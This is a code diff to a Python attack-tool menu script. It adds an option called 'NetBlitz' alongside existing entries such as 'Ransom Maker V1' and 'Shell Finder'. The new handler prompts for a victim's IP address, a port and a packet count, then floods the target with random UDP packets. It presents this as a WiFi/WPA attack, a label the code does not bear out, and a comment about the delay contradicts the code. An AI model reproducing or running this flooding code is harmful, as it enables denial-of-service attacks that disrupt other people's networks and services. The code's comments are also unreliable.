@@ -1079,7 +1079,7 @@ def m2():
     {yellow}│{blue} [03] Shell Finder                                                                               {yellow}│{blue}
     {yellow}│{blue} [04] {green}Ransom Maker V1                                                                            {yellow}│{blue}
     {yellow}│{blue} [05] {gold}SQLite V1{blue}                                                                                  {yellow}│{blue}
-    {yellow}│{blue}                                                                                                 {yellow}│{blue}
+    {yellow}│{blue} [06] NetBlitz {red}[Cool]{blue}                                                                            {yellow}│{blue}
     {yellow}│{blue}                                                                                                 {yellow}│{blue}
     {yellow}│{blue}                                                                                                 {yellow}│{blue}
     {yellow}│{blue}                                                                                                 {yellow}│{blue}
@@ -5465,6 +5465,49 @@ elif answer == ("20"):
         elif answer == '5':
             pass
             sqlite()
+        elif answer == '6':
+            if os.name == 'posix':
+                os.system('clear')
+            elif os.name == 'nt':
+                os.system('cls')
+            logo = f"{gold}███╗   ██╗███████╗████████╗██████╗ ██╗     ██╗████████╗███████╗\n"
+            logo += "████╗  ██║██╔════╝╚══██╔══╝██╔══██╗██║     ██║╚══██╔══╝╚══███╔╝\n"
+            logo += "██╔██╗ ██║█████╗     ██║   ██████╔╝██║     ██║   ██║     ███╔╝ \n"
+            logo += "██║╚██╗██║██╔══╝     ██║   ██╔══██╗██║     ██║   ██║    ███╔╝  \n"
+            logo += "██║ ╚████║███████╗   ██║   ██████╔╝███████╗██║   ██║   ███████╗\n"
+            logo += f"╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═════╝ ╚══════╝╚═╝   ╚═╝   ╚══════╝{white}\n\n"
+            print(logo)
+            def wifi_flood():
+                # Set the victim's IP address
+                victim_ip = input("Enter the victim's IP address [Example : 192.168.1.3] : ")
+                port = int(input("Target Port : "))
+                nuke = int(input("Enter flood packet [Example : 20000]: "))
+                if nuke:
+                    nuke = nuke
+                else:
+                    nuke = 20000
+
+                # Create a socket object
+                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+
+                for i in range(nuke):
+                    # Generate a random WPA header
+                    wpa_header = ''.join(random.choices("0123456789ABCDEF", k=64))
+
+                    # Set the packet payload
+                    payload = wpa_header
+                    buffer = random._urandom(120*3)
+                    try:
+                        print(f"{yellow}[{green}~{yellow}] {gold}Attacked with payload : {payload} target : {victim_ip}")
+                        sock.sendto(payload.encode(), (victim_ip, port))
+                        sock.sendto(buffer, (victim_ip, port))
+                    except socket.error:
+                        pass
+
+                    # Delay for a random amount of time between 0.5 to 1 second
+                    time.sleep(0.1)
+            # Start the WiFi flood attack
+            wifi_flood()
         else:
             print(green + f"Exit..")
             exit()
